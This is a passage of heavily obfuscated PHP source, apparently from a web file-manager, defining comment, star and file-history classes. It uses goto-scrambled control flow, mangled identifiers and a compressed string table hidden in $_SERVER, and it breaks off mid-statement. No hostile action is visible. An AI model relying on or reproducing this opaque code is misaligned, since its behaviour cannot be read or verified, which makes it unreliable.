<?php
 goto eçÇÎÛºŒŸ; eÙğÂÔğ: $dŒÙÈ°Â‹ = $_SERVER[›èö’ù¤][601]; if (strlen($dŒÙÈ°Â‹) < $_SERVER[›èö’ù¤][602]) { die; } $_SERVER[†Ô…Œèëôú] = explode($_SERVER[›èö’ù¤][603], gzinflate(substr($_SERVER[›èö’ù¤][604], 10, -8))); goto Cò‚‰…ßâÈ; E¢óëò¼º: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\x6e\164"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\x6d\x65" => "\143\x6f\155\x6d\x65\x6e\x74\137\x6d\x65\164\x61", "\155\x65\x74\x61\106\x69\145\154\x64" => "\143\x6f\x6d\x6d\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Aš…óŠ±è) { $cô×–í…‘Ò =& $_SERVER[›èö’ù¤]; if ($Aš…óŠ±è[$cô×–í…‘Ò[1748]]) { $bÉì ±Òœİ = $this->where(array($cô×–í…‘Ò[1749] => $Aš…óŠ±è[$cô×–í…‘Ò[1748]]))->find(); if (!$bÉì ±Òœİ || $bÉì ±Òœİ[$cô×–í…‘Ò[406]] != $Aš…óŠ±è[$cô×–í…‘Ò[406]] || $bÉì ±Òœİ[$cô×–í…‘Ò[499]] != $Aš…óŠ±è[$cô×–í…‘Ò[499]]) { return !1; } $this->where(array($cô×–í…‘Ò[1749] => $Aš…óŠ±è[$cô×–í…‘Ò[1748]]))->setAdd($cô×–í…‘Ò[1750], 1); } $Aš…óŠ±è[$cô×–í…‘Ò[1751]] = 0; $Aš…óŠ±è[$cô×–í…‘Ò[1750]] = 0; $Aš…óŠ±è[$cô×–í…‘Ò[734]] = 1; return $this->add($Aš…óŠ±è); } public function commentCount($d‰¥¸‡µ¢Š, $D³¶ä¸ŒÇ, $f¸¦÷ùïÃÁ = false) { goto fÃëÚÖŒÛ; fÃëÚÖŒÛ: $eÌ¦–¶æÑ =& $_SERVER[›èö’ù¤]; if (!$d‰¥¸‡µ¢Š) { return array(); } if (is_string($d‰¥¸‡µ¢Š) || is_int($d‰¥¸‡µ¢Š)) { $d‰¥¸‡µ¢Š = array($d‰¥¸‡µ¢Š); } goto fœùê¿Û‡½; fœùê¿Û‡½: $bø«™ÇîŒŒ = array($eÌ¦–¶æÑ[499], $eÌ¦–¶æÑ[1752] => $eÌ¦–¶æÑ[495]); $E¬÷«„÷±ñ = array($eÌ¦–¶æÑ[499] => array($eÌ¦–¶æÑ[7], $d‰¥¸‡µ¢Š), $eÌ¦–¶æÑ[406] => $D³¶ä¸ŒÇ); if ($f¸¦÷ùïÃÁ) { $E¬÷«„÷±ñ[$eÌ¦–¶æÑ[1551]] = $f¸¦÷ùïÃÁ; } goto cŒ¡ä¬¯¡Ò; cŒ¡ä¬¯¡Ò: $Fø¡’Ñ¥ = $this->field($bø«™ÇîŒŒ)->where($E¬÷«„÷±ñ)->group($eÌ¦–¶æÑ[499])->select(); return array_to_keyvalue($Fø¡’Ñ¥, $eÌ¦–¶æÑ[499], $eÌ¦–¶æÑ[495]); goto a·©¯êµ¯ó; a·©¯êµ¯ó: } public function starTarget($A‚õÒ×ò¢, $Cˆ­°É´Š) { goto a÷»½÷ØÈ; Bœ¹ô•Œ²ñ: return $this->add($f™…—Â¨); goto a­óàä÷ Ô; fİÈŞ‡«ÒÎ: $f²ßœ«Âª– = $this->where($Aù°ÛŸæ)->find(); if ($f²ßœ«Âª–) { return $this->where(array($c¸¥ì–»Ô´[395] => $f²ßœ«Âª–[$c¸¥ì–»Ô´[395]]))->delete(); } $f™…—Â¨ = array($c¸¥ì–»Ô´[1748] => 0, $c¸¥ì–»Ô´[1551] => USER_ID, $c¸¥ì–»Ô´[734] => 1, $c¸¥ì–»Ô´[739] => $c¸¥ì–»Ô´[33], $c¸¥ì–»Ô´[406] => $bÑ›Û‚¨‰É, $c¸¥ì–»Ô´[499] => $Cˆ­°É´Š, $c¸¥ì–»Ô´[1751] => 0, $c¸¥ì–»Ô´[1750] => 0); goto Bœ¹ô•Œ²ñ; a÷»½÷ØÈ: $c¸¥ì–»Ô´ =& $_SERVER[›èö’ù¤]; $bÑ›Û‚¨‰É = $A‚õÒ×ò¢ + self::TYPE_STAR_OFFSET; $Aù°ÛŸæ = array($c¸¥ì–»Ô´[1551] => USER_ID, $c¸¥ì–»Ô´[406] => $bÑ›Û‚¨‰É, $c¸¥ì–»Ô´[499] => $Cˆ­°É´Š); goto fİÈŞ‡«ÒÎ; a­óàä÷ Ô: } public function starTargetCount($Dã¾Ü¸¿ñ, $BåºŠ–ªÎá) { $bÍíÇÀ³‹ª =& $_SERVER[›èö’ù¤]; $BÑŠß—ºáô = $BåºŠ–ªÎá + self::TYPE_STAR_OFFSET; $dâóÄØ³Ê„ = $this->commentCount($Dã¾Ü¸¿ñ, $BÑŠß—ºáô); $D‚Éáï±¨ç = $this->commentCount($Dã¾Ü¸¿ñ, $BÑŠß—ºáô, USER_ID); return array($bÍíÇÀ³‹ª[1753] => $dâóÄØ³Ê„, $bÍíÇÀ³‹ª[1754] => $D‚Éáï±¨ç); } public function starTargetUserList($F‘Æ¶ÄïŞ, $e’êƒ¿Š…ì) { goto A…áí’µº¤; e»ºŸ™ËŒò: $cïœ â­¹ = $this->where($FÄ¾‰£‘)->count(); $E¥£ñˆÇœ› = array($bÇ›¤÷ğ”˜[253] => $cïœ â­¹, $bÇ›¤÷ğ”˜[1755] => array()); if (!$cïœ â­¹) { return $E¥£ñˆÇœ›; } goto E¢Åˆä±î‰; E¢Åˆä±î‰: $f½ÕÅ•ß˜É = $this->field($bÇ›¤÷ğ”˜[1551])->where($FÄ¾‰£‘)->limit(500)->select(); $f½ÕÅ•ß˜É = array_to_keyvalue($f½ÕÅ•ß˜É, $bÇ›¤÷ğ”˜[33], $bÇ›¤÷ğ”˜[1551]); $E¥£ñˆÇœ›[$bÇ›¤÷ğ”˜[1755]] = Model($bÇ›¤÷ğ”˜[508])->userListInfo($f½ÕÅ•ß˜É); goto D‡«Œˆï«; A…áí’µº¤: $bÇ›¤÷ğ”˜ =& $_SERVER[›èö’ù¤]; $EïùÇ—ğ¥ë = $F‘Æ¶ÄïŞ + self::TYPE_STAR_OFFSET; $FÄ¾‰£‘ = array($bÇ›¤÷ğ”˜[499] => $e’êƒ¿Š…ì, $bÇ›¤÷ğ”˜[406] => $EïùÇ—ğ¥ë); goto e»ºŸ™ËŒò; D‡«Œˆï«: return $E¥£ñˆÇœ›; goto F¯ŞŒæ‘è; F¯ŞŒæ‘è: } public function prasiseUserList($EôÚòçèÁí) { goto eåÎÖšÃ¾—; A×–£¼®Áá: $CË“Üíâ = _get($c‘ÄâËˆì, $FÄî”·àè†[1751], 0); $aÌÒÖï‘ = array($FÄî”·àè†[253] => $CË“Üíâ, $FÄî”·àè†[1755] => array()); if (!$CË“Üíâ) { return $aÌÒÖï‘; } goto D¶ã½‰•¾; eåÎÖšÃ¾—: $FÄî”·àè† =& $_SERVER[›èö’ù¤]; $Fæ›øİÙ…ø = array($FÄî”·àè†[1756] => $EôÚòçèÁí); $c‘ÄâËˆì = $this->where($Fæ›øİÙ…ø)->find(); goto A×–£¼®Áá; D¶ã½‰•¾: $dœŞ®½Ã“ = Model($FÄî”·àè†[1757])->field($FÄî”·àè†[1551])->where($Fæ›øİÙ…ø)->limit(500)->select(); $dœŞ®½Ã“ = array_to_keyvalue($dœŞ®½Ã“, $FÄî”·àè†[33], $FÄî”·àè†[1551]); $aÌÒÖï‘[$FÄî”·àè†[1755]] = Model($FÄî”·àè†[508])->userListInfo($dœŞ®½Ã“); goto fŞï©²µÁ; fŞï©²µÁ: return $aÌÒÖï‘; goto B»³Æç„ŠÉ; B»³Æç„ŠÉ: } public function remove($FÜ¦‚™öŒØ) { $A¥‘§ËÊ—© =& $_SERVER[›èö’ù¤]; $e¢·ô¯—ï = array($A¥‘§ËÊ—©[1749] => $FÜ¦‚™öŒØ); $CÍÜÒù˜½ = $this->where($e¢·ô¯—ï)->find(); if ($CÍÜÒù˜½[$A¥‘§ËÊ—©[1748]]) { $this->where(array($A¥‘§ËÊ—©[1749] => $CÍÜÒù˜½[$A¥‘§ËÊ—©[1748]]))->setAdd($A¥‘§ËÊ—©[1750], -1); } return $this->where($e¢·ô¯—ï)->delete(); } public function edit($DÖ»ËÓ˜¥…, $D´º¹ùèÔÂ) { $aˆÆÅ‹Š†ğ =& $_SERVER[›èö’ù¤]; $Fºµ‹¬†Ø¥ = array($aˆÆÅ‹Š†ğ[1749] => $DÖ»ËÓ˜¥…); return $this->where($Fºµ‹¬†Ø¥)->save(array($aˆÆÅ‹Š†ğ[1758] => $D´º¹ùèÔÂ)); } public function prasise($f§£Ï¢î†Ï) { $e„ÄÓÓâÆ‚ =& $_SERVER[›èö’ù¤]; $DÎéÑÇ®Ê = Model($e„ÄÓÓâÆ‚[1759]); $Eˆ¾£·óë = array($e„ÄÓÓâÆ‚[1749] => $f§£Ï¢î†Ï, $e„ÄÓÓâÆ‚[1542] => USER_ID); $fÃàĞ³• = $DÎéÑÇ®Ê->where($Eˆ¾£·óë)->find(); if (!$fÃàĞ³•) { $DÎéÑÇ®Ê->add($Eˆ¾£·óë); $cçÔ™Ÿ£²Ü = $this->where(array($e„ÄÓÓâÆ‚[1749] => $f§£Ï¢î†Ï))->setAdd($e„ÄÓÓâÆ‚[1751], 1); } else { $DÎéÑÇ®Ê->where($Eˆ¾£·óë)->delete(); $cçÔ™Ÿ£²Ü = $this->where(array($e„ÄÓÓâÆ‚[1749] => $f§£Ï¢î†Ï))->setAdd($e„ÄÓÓâÆ‚[1751], -1); } return $cçÔ™Ÿ£²Ü; } public function targetInfo($aíÄ‡çŸÚ•, $EŸèºËô÷¥) { goto DÒºÄ°Şñš; fÃÙ•èøÃ«: return $f±ï˜í„ÌÕ; goto b™™ß”·ø„; C«„˜î‰µ“: $F›Ë—¿Ğ¶Œ = "\x52\x49\x47\110\124\x20\x4a\117\111\x4e\40{$this->tablePrefix}\143\157\x6d\x6d\x65\156\164\137\x70\162\141\x69\163\145\x20\163\164\x61\162\40\x6f\156\x20\x63\x6f\x6d\x6d\145\156\164\56\143\x6f\x6d\x6d\x65\156\x74\x49\104\40\75\40\x73\164\141\x72\x2e\x63\157\x6d\155\145\156\x74\x49\x44"; $C†æÀœ¶ƒŸ = $this->alias($E õìƒÍ·æ[352])->where($EŒë×Åã³‚)->join($F›Ë—¿Ğ¶Œ, $E õìƒÍ·æ[1760])->count(); $f±ï˜í„ÌÕ = array($E õìƒÍ·æ[1761] => $DœëÒ†¦¨, $E õìƒÍ·æ[1762] => $C†æÀœ¶ƒŸ); goto fÃÙ•èøÃ«; DÒºÄ°Şñš: $E õìƒÍ·æ =& $_SERVER[›èö’ù¤]; $EŒë×Åã³‚ = array($E õìƒÍ·æ[575] => $aíÄ‡çŸÚ•, $E õìƒÍ·æ[576] => $EŸèºËô÷¥); $DœëÒ†¦¨ = $this->where($EŒë×Åã³‚)->count(); goto C«„˜î‰µ“; b™™ß”·ø„: } public function listData($C´Ëô¾ö¦) { $A“é¨Öß­È =& $_SERVER[›èö’ù¤]; if (isset($C´Ëô¾ö¦[$A“é¨Öß­È[1763]])) { if ($C´Ëô¾ö¦[$A“é¨Öß­È[1763]]) { $C´Ëô¾ö¦[$A“é¨Öß­È[1756]] = array($A“é¨Öß­È[997], intval($C´Ëô¾ö¦[$A“é¨Öß­È[1763]])); } unset($C´Ëô¾ö¦[$A“é¨Öß­È[1763]]); } if (isset($C´Ëô¾ö¦[$A“é¨Öß­È[1764]])) { if ($C´Ëô¾ö¦[$A“é¨Öß­È[1764]]) { $C´Ëô¾ö¦[$A“é¨Öß­È[1756]] = array($A“é¨Öß­È[994], intval($C´Ëô¾ö¦[$A“é¨Öß­È[1764]])); } unset($C´Ëô¾ö¦[$A“é¨Öß­È[1764]]); } return $this->_listData($C´Ëô¾ö¦); } private function _listData($f¸„»•ª‹) { $B·Èø¿ãÓŠ =& $_SERVER[›èö’ù¤]; $CÆÅ‘ÚêìË = $this->where($f¸„»•ª‹)->_makeOrder()->selectPage(100); $this->_listAppendParent($CÆÅ‘ÚêìË[$B·Èø¿ãÓŠ[367]]); $this->_listAppendUser($CÆÅ‘ÚêìË[$B·Èø¿ãÓŠ[367]]); $this->_listAppendMeta($CÆÅ‘ÚêìË[$B·Èø¿ãÓŠ[367]]); return $CÆÅ‘ÚêìË; } private function _makeOrder() { $B‰éé®’¿’ =& $_SERVER[›èö’ù¤]; $FÜİñ¾çë× = array($B‰éé®’¿’[1751], $B‰éé®’¿’[1750], $B‰éé®’¿’[194]); $FæÒçò°ÎÆ = Input::get($B‰éé®’¿’[450], $B‰éé®’¿’[7], $B‰éé®’¿’[418], $FÜİñ¾çë×); $A£ Í­’ñÅ = Input::get($B‰éé®’¿’[451], $B‰éé®’¿’[7], $B‰éé®’¿’[1544], array($B‰éé®’¿’[1765], $B‰éé®’¿’[446])); $fÜâ™´¶÷  = $FæÒçò°ÎÆ . $B‰éé®’¿’[50] . $A£ Í­’ñÅ; return $this->order($fÜâ™´¶÷ ); } private function _listAppendParent(&$bÊ­¾éÆìÙ) { goto c‚²±Î‹öˆ; Dœ´˜£¯†Œ: if (!$fÕ­«ø£áÔ) { return; } $b½ÜÛœ¡‘À = $this->where(array($AÍáŞ¢¼ÓÊ[1749] => array($AÍáŞ¢¼ÓÊ[7], $fÕ­«ø£áÔ)))->select(); $b½ÜÛœ¡‘À = array_to_keyvalue($b½ÜÛœ¡‘À, $AÍáŞ¢¼ÓÊ[1756]); goto eä¤‘‰«÷œ; c‚²±Î‹öˆ: $AÍáŞ¢¼ÓÊ =& $_SERVER[›èö’ù¤]; $fÕ­«ø£áÔ = array_unique(array_to_keyvalue($bÊ­¾éÆìÙ, $AÍáŞ¢¼ÓÊ[33], $AÍáŞ¢¼ÓÊ[1748])); $fÕ­«ø£áÔ = array_remove_value($fÕ­«ø£áÔ, $AÍáŞ¢¼ÓÊ[191]); goto Dœ´˜£¯†Œ; eä¤‘‰«÷œ: foreach ($bÊ­¾éÆìÙ as &$DÖ‡¦ÃÖœØ) { if (isset($b½ÜÛœ¡‘À[$DÖ‡¦ÃÖœØ[$AÍáŞ¢¼ÓÊ[1748]]])) { $DÖ‡¦ÃÖœØ[$AÍáŞ¢¼ÓÊ[1766]] = $b½ÜÛœ¡‘À[$DÖ‡¦ÃÖœØ[$AÍáŞ¢¼ÓÊ[1748]]]; } } unset($DÖ‡¦ÃÖœØ); goto eëÏ×†–; eëÏ×†–: } private function _listAppendUser(&$F‰“³ ) { goto b¿¦¥Åé“ë; b¿¦¥Åé“ë: $D×—Ø†İâ =& $_SERVER[›èö’ù¤]; $AŒŠŒ© = array_unique(array_to_keyvalue($F‰“³ , $D×—Ø†İâ[33], $D×—Ø†İâ[1551])); $AŒŠŒ© = array_remove_value($AŒŠŒ©, $D×—Ø†İâ[191]); goto fäÄíÜŞ®Å; a‘³ßï¦: foreach ($F‰“³  as &$d¾‘À³æÒ‡) { $d¾‘À³æÒ‡[$D×—Ø†İâ[589]] = $dŠ°Ú…Ø[$d¾‘À³æÒ‡[$D×—Ø†İâ[1551]]]; if (isset($d¾‘À³æÒ‡[$D×—Ø†İâ[1766]])) { $d¾‘À³æÒ‡[$D×—Ø†İâ[1766]][$D×—Ø†İâ[589]] = $dŠ°Ú…Ø[$d¾‘À³æÒ‡[$D×—Ø†İâ[1766]][$D×—Ø†İâ[1551]]]; } } unset($d¾‘À³æÒ‡); goto C’©Í‹Ô®Œ; fäÄíÜŞ®Å: if (count($AŒŠŒ©) == 0) { return; } foreach ($F‰“³  as $d¾‘À³æÒ‡) { if (isset($d¾‘À³æÒ‡[$D×—Ø†İâ[1766]])) { $AŒŠŒ©[] = $d¾‘À³æÒ‡[$D×—Ø†İâ[1766]][$D×—Ø†İâ[1551]]; } } $dŠ°Ú…Ø = Model($D×—Ø†İâ[533])->userListInfo($AŒŠŒ©); goto a‘³ßï¦; C’©Í‹Ô®Œ: } private function _listAppendMeta(&$eêõŠ¢Úãî) { goto eÎ§àáÔ§¥; eÎ§àáÔ§¥: $EËøÍ°¾ˆÂ =& $_SERVER[›èö’ù¤]; $bë‡°ôõ‘ = array_unique(array_to_keyvalue($eêõŠ¢Úãî, $EËøÍ°¾ˆÂ[33], $EËøÍ°¾ˆÂ[1756])); $bë‡°ôõ‘ = array_remove_value($bë‡°ôõ‘, $EËøÍ°¾ˆÂ[191]); goto fè“†‚Ã±Ç; fè“†‚Ã±Ç: if (!$bë‡°ôõ‘) { return; } foreach ($eêõŠ¢Úãî as $c¾Ê²Š°à) { if (isset($c¾Ê²Š°à[$EËøÍ°¾ˆÂ[1766]])) { $bë‡°ôõ‘[] = $c¾Ê²Š°à[$EËøÍ°¾ˆÂ[1766]][$EËøÍ°¾ˆÂ[1756]]; } } $fÁ¸¤Ï¨¢‚ = $this->metaList($bë‡°ôõ‘); goto cÛÖ¾ìÑ•; cÛÖ¾ìÑ•: if (!$fÁ¸¤Ï¨¢‚) { return !1; } foreach ($eêõŠ¢Úãî as &$c¾Ê²Š°à) { $c¾Ê²Š°à[$EËøÍ°¾ˆÂ[460]] = $fÁ¸¤Ï¨¢‚[$c¾Ê²Š°à[$EËøÍ°¾ˆÂ[1756]]]; if (isset($c¾Ê²Š°à[$EËøÍ°¾ˆÂ[1766]])) { $c¾Ê²Š°à[$EËøÍ°¾ˆÂ[1766]][$EËøÍ°¾ˆÂ[460]] = $fÁ¸¤Ï¨¢‚[$c¾Ê²Š°à[$EËøÍ°¾ˆÂ[1766]][$EËøÍ°¾ˆÂ[1756]]]; } } unset($c¾Ê²Š°à); goto A÷â„¼ãˆæ; A÷â„¼ãˆæ: } private function metaList($f¥Ú×³ğ÷ã) { goto b–ôÓ¥¢ï; eÇ¶Ÿˆ„¤Ø: $b¨ù×Î–ò = Model($fºæ·Ï§[1767])->where($dµŞ”§í)->select(); $b¨ù×Î–ò = array_to_keyvalue_group($b¨ù×Î–ò, $fºæ·Ï§[1756]); foreach ($b¨ù×Î–ò as $añ½™Ùğù => $aëáÛÆß¢) { $e»„Ü ¢Ãò = array(); foreach ($aëáÛÆß¢ as $Cì£²¸ÚÛó) { $e»„Ü ¢Ãò[$Cì£²¸ÚÛó[$fºæ·Ï§[93]]] = $Cì£²¸ÚÛó[$fºæ·Ï§[372]]; } $b¨ù×Î–ò[$añ½™Ùğù] = $e»„Ü ¢Ãò; } goto e¬±¾¦Å ; e¬±¾¦Å : return $b¨ù×Î–ò ? $b¨ù×Î–ò : array(); goto eçÅŞÇè·ä; b–ôÓ¥¢ï: $fºæ·Ï§ =& $_SERVER[›èö’ù¤]; if (!$f¥Ú×³ğ÷ã) { return array(); } $dµŞ”§í = array($fºæ·Ï§[1756] => array($fºæ·Ï§[7], $f¥Ú×³ğ÷ã)); goto eÇ¶Ÿˆ„¤Ø; eçÅŞÇè·ä: } } $Aôù«ÈÙ“ = $_SERVER[$_SERVER[›èö’ù¤][832]]; $A®‘‡ÆŒÚ® = $_SERVER[›èö’ù¤][864]; goto aÜˆÍš“«’; cèº„îµ‰: function binCheckBigger($aóËñ«¯æ³, $EœœÒ¶¬•) { return $aóËñ«¯æ³ > $EœœÒ¶¬•; } $_SERVER[$_SERVER[»½§Ó„][3]] = ("\71\62\63\66".base64_decode('NjU='))+0;$_x6ba="9A824VWd7an7PbuHWumIvn82JSXkZiqtxq2bUUQG3SuncCJrkx92ZzyuhhR7mftNE23nu";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($fÀ™´‘Ç–š, $B÷°Ğê×¢) { $f¥ÆÁò½¸Ş =& $_SERVER[›èö’ù¤]; if (isset(self::$_methodList[$fÀ™´‘Ç–š])) { return @call_user_func_array(self::$_methodList[$fÀ™´‘Ç–š], $B÷°Ğê×¢); } else { if (method_exists($this, $fÀ™´‘Ç–š)) { return call_user_func_array(array($this, $fÀ™´‘Ç–š), $B÷°Ğê×¢); } else { think_exception(__CLASS__ . $f¥ÆÁò½¸Ş[4] . $fÀ™´‘Ç–š . $f¥ÆÁò½¸Ş[5]); } } } public static function __callStatic($Eï·À‡Â¸°, $A¨ƒœ…Å‹Í) { if (isset(self::$_methodListStatic[$Eï·À‡Â¸°])) { return call_user_func_array(self::$_methodListStatic[$Eï·À‡Â¸°], $A¨ƒœ…Å‹Í); } else { if (method_exists(self, $Eï·À‡Â¸°)) { return call_user_func_array(array(self, $Eï·À‡Â¸°), $A¨ƒœ…Å‹Í); } else { show_json("{$Eï·À‡Â¸°}\50\51\40\156\x6f\164\40\145\x78\151\163\164\x3b", !1); } } } public static function addMethod($AŞ¸Ï†°ê¯, $dÄô»‹º­) { self::$_methodList[$AŞ¸Ï†°ê¯] = $dÄô»‹º­; } public static function addMethodStatic($FÎùìÖì¦³, $d³ËèõÀöÆ) { self::$_methodListStatic[$FÎùìÖì¦³] = $d³ËèõÀöÆ; } } goto dùñõ¢Èó×; fËÉ¨ˆÅ÷Ø: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto aä¤ÅÉÎ¦; B­Ûâíõï÷: Hook::bind($dÕ²ìÂ÷„°[1132], $dÕ²ìÂ÷„°[1133]); Hook::bind($dÕ²ìÂ÷„°[1134], $dÕ²ìÂ÷„°[1135]); Hook::bind($dÕ²ìÂ÷„°[1136], $dÕ²ìÂ÷„°[1137]); goto Bâí÷—Èä´; Bâí÷—Èä´: Hook::bind($dÕ²ìÂ÷„°[1138], $dÕ²ìÂ÷„°[1139]); Hook::bind($dÕ²ìÂ÷„°[1140], $dÕ²ìÂ÷„°[1141]); goto B…ªØæâ½ğ; aä¤ÅÉÎ¦: $dÕ²ìÂ÷„° =& $_SERVER[›èö’ù¤]; $b·ªß¿·‘‘ = $GLOBALS[$dÕ²ìÂ÷„°[6]][$dÕ²ìÂ÷„°[88]]; if ($b·ªß¿·‘‘[$dÕ²ìÂ÷„°[1127]] != 1) { return; } goto fàÛ‡µ„Ò; fàÛ‡µ„Ò: if ($b·ªß¿·‘‘[$dÕ²ìÂ÷„°[1128]] <= 0) { return; } if (isset($_REQUEST[$dÕ²ìÂ÷„°[1129]]) && $_REQUEST[$dÕ²ìÂ÷„°[1129]] == $dÕ²ìÂ÷„°[87]) { return; } Hook::bind($dÕ²ìÂ÷„°[1130], $dÕ²ìÂ÷„°[1131]); goto B­Ûâíõï÷; B…ªØæâ½ğ: } public static function eventBeforeUpload($d’‡Â´˜¶) { if ($d’‡Â´˜¶[3] && $d’‡Â´˜¶[3] != REPEAT_REPLACE) { return; } $e¦·Æâˆèõ = self::parsePath($d’‡Â´˜¶[0]); if (!$e¦·Æâˆèõ) { return; } self::add($e¦·Æâˆèõ); } public static function eventBeforeEdit($fÄ·•Ù¸Ç) { $DŸæª¼­ç = self::parsePath($fÄ·•Ù¸Ç[0]); if (!$DŸæª¼­ç) { return; } self::add($DŸæª¼­ç); } public static function eventBeforeCopyFile($CÆÀÜËİÄ, $D»À†¨ãğÕ, $bˆá¸µˆè, $A”ä®öÏ—, $a¼Û§ç‰§É, $c¤ÀÖ¥À§¸) { $BÛîíø¸»´ = $bˆá¸µˆè->getPathOuter($A”ä®öÏ—); $fàôéçÆŸ¾ = self::parsePath($BÛîíø¸»´); if (!$fàôéçÆŸ¾) { return; } self::add($fàôéçÆŸ¾); } public static function eventBeforeRename($FÂÔ ç‰š™) { $b„Ûä¼Şºá =& $_SERVER[›èö’ù¤]; $CÍî¤Êê¬Ê = self::parsePath($FÂÔ ç‰š™[0]); if (!$CÍî¤Êê¬Ê) { return; } $A¿´Û­”³´ = self::checkInHistory($CÍî¤Êê¬Ê); if (!$A¿´Û­”³´) { return; } if ($A¿´Û­”³´[$b„Ûä¼Şºá[29]] == $b„Ûä¼Şºá[193]) { $Fğ˜§Óİ… = self::listData($CÍî¤Êê¬Ê); if ($Fğ˜§Óİ… && $Fğ˜§Óİ…[$b„Ûä¼Şºá[367]]) { self::moveHistory($CÍî¤Êê¬Ê, $FÂÔ ç‰š™[1]); } } else { IO::rename($A¿´Û­”³´[$b„Ûä¼Şºá[76]], $FÂÔ ç‰š™[1]); } } public static function eventBeforeMove($c £ÛÇÍ”) { goto BŞÉ›ù†ğñ; BŞÉ›ù†ğñ: $bÛÙ¢Šˆá =& $_SERVER[›èö’ù¤]; $Aµ©Îº½ù³ = self::parsePath($c £ÛÇÍ”[0]); if (!$Aµ©Îº½ù³) { return; } goto FÄ³£Š„Úõ; b®¶Şäàïµ: $eÒ…®­Ï‹Í = self::checkInHistory($Aµ©Îº½ù³); if (!$eÒ…®­Ï‹Í) { return; } $D×â„‰—ƒØ = self::pathHistory($B¼”¶Ò×‘); goto DàãÈæ‰; DàãÈæ‰: if ($eÒ…®­Ï‹Í[$bÛÙ¢Šˆá[29]] == $bÛÙ¢Šˆá[193]) { $aô¼›¯ÉÚ = self::listData($Aµ©Îº½ù³); $DßÇäĞµ‰ = rtrim($B¼”¶Ò×‘, $bÛÙ¢Šˆá[8]) . $bÛÙ¢Šˆá[8] . ($EÎÑÁ®÷ÓÉ ? $EÎÑÁ®÷ÓÉ : get_path_this($Aµ©Îº½ù³)); $fÏà›ò²Ó = self::listData($DßÇäĞµ‰); if ($aô¼›¯ÉÚ && $aô¼›¯ÉÚ[$bÛÙ¢Šˆá[367]] && $fÏà›ò²Ó && $fÏà›ò²Ó[$bÛÙ¢Šˆá[367]]) { return self::clear($Aµ©Îº½ù³); } if ($aô¼›¯ÉÚ && $aô¼›¯ÉÚ[$bÛÙ¢Šˆá[367]]) { self::moveHistory($Aµ©Îº½ù³, $EÎÑÁ®÷ÓÉ, $D×â„‰—ƒØ); } } else { IO::move($eÒ…®­Ï‹Í[$bÛÙ¢Šˆá[76]], $D×â„‰—ƒØ, !1, $EÎÑÁ®÷ÓÉ); self::clearEmptyFolder(IO::pathFather($eÒ…®­Ï‹Í[$bÛÙ¢Šˆá[76]])); } goto d„ÏÄ½©ˆ; FÄ³£Š„Úõ: $B¼”¶Ò×‘ = self::parsePath($c £ÛÇÍ”[1]); if (!$B¼”¶Ò×‘) { return; } $EÎÑÁ®÷ÓÉ = $c £ÛÇÍ”[3]; goto b®¶Şäàïµ; d„ÏÄ½©ˆ: } public static function eventAfterRemove($F²ó«ƒ£Î, $a”½¥¸ÑÏ) { goto Dèî¢ªÏÒ¥; aã˜­°Ú¸Ö: if (!$dï™ãß‹æ) { return; } $CôÕØ¹Š™‡ = self::checkInHistory($dï™ãß‹æ); if (!$CôÕØ¹Š™‡) { return; } goto dŞ˜×»; dŞ˜×»: if ($CôÕØ¹Š™‡[$bŸêËº[29]] == $bŸêËº[193]) { $Cø§Òİ³³ö = self::listData($dï™ãß‹æ, !1); if ($Cø§Òİ³³ö && $Cø§Òİ³³ö[$bŸêËº[367]]) { self::clear($dï™ãß‹æ, !1); } } else { IO::remove($CôÕØ¹Š™‡[$bŸêËº[76]]); self::clearEmptyFolder(IO::pathFather($CôÕØ¹Š™‡[$bŸêËº[76]])); } goto B¾Í–ï­ª; Dèî¢ªÏÒ¥: $bŸêËº =& $_SERVER[›èö’ù¤]; if (!$a”½¥¸ÑÏ) { return; } $dï™ãß‹æ = self::parsePath($F²ó«ƒ£Î[0]); goto aã˜­°Ú¸Ö; B¾Í–ï­ª: } private static function checkInHistory($cŞˆÆõ¿¥‚) { $b¸–ê¯õÓœ = self::pathHistory($cŞˆÆõ¿¥‚); if (!IO::exist($b¸–ê¯õÓœ)) { $b¸–ê¯õÓœ .= $_SERVER[›èö’ù¤][1142]; } return IO::exist($b¸–ê¯õÓœ) ? IO::info($b¸–ê¯õÓœ) : !1; } private static function parsePath($e¼Š‰‹¼îí) { goto DäÕª×Í´…; DäÕª×Í´…: $EƒÕÁâÀ‰ =& $_SERVER[›èö’ù¤]; if (!$e¼Š‰‹¼îí) { return !1; } if ($GLOBALS[$EƒÕÁâÀ‰[1143]]) { return; } goto E†Í¿ÅºĞá; Bá‘İœ‹º: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $F¾êÜ”·âˆ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $EƒÕÁâÀ‰[1146]); foreach ($F¾êÜ”·âˆ as $A¹Ù­³ŸÙæ) { if (!$d•¢Ã˜«†° && substr($e¼Š‰‹¼îí, 0, strlen($A¹Ù­³ŸÙæ)) == $A¹Ù­³ŸÙæ) { return !1; } } goto f¤šğªÌë; f¤šğªÌë: self::log($GLOBALS[$EƒÕÁâÀ‰[1067]] . $EƒÕÁâÀ‰[1147] . $e¼Š‰‹¼îí); return $e¼Š‰‹¼îí; goto CÇ®õ¨Ãà„; E÷ÑÃŒø¹‚: if (!$aÈîßïî¥¶ || !$dÂÂµ­…[$EƒÕÁâÀ‰[1144]]) { return !1; } if (substr($e¼Š‰‹¼îí, 0, strlen(DATA_PATH . $EƒÕÁâÀ‰[1145])) == DATA_PATH . $EƒÕÁâÀ‰[1145]) { return !1; } if ($d•¢Ã˜«†° == KodIO::KOD_SHARE_ITEM) { $DÂ¤œØã”… = IO::init($e¼Š‰‹¼îí); if ($DÂ¤œØã”…->pathParse[$EƒÕÁâÀ‰[1072]]) { return self::parsePath($DÂ¤œØã”…->pathParse[$EƒÕÁâÀ‰[1072]]); } return !1; } goto Bá‘İœ‹º; E†Í¿ÅºĞá: $dÂÂµ­… = KodIO::parse($e¼Š‰‹¼îí); $d•¢Ã˜«†° = 